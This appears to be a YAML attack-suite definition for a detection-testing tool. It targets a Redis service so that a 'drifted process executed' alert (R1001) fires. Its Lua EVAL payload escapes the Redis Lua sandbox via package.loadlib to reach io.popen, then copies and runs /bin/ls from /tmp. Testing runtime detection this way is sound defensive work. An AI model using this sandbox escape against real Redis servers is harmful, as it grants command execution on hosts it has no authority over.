apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-attack-06-drifted-binary
  description: "Copy+exec binary not in image. Triggers R1001."
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis
attacks:
  - name: drifted-binary-exec
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        local f = io_mod.popen('cp /bin/ls /tmp/drifted_redis && /tmp/drifted_redis /etc 2>&1; rm -f /tmp/drifted_redis')
        local out = f:read('*a')
        f:close()
        return 'drifted:' .. out
    successIndicators:
      - responseContains: "drifted:"
expectedDetections:
  - attackType: fileless
    ruleID: R1001
    ruleName: "Drifted process executed"
    containerName: redis
    command: drifted_redis
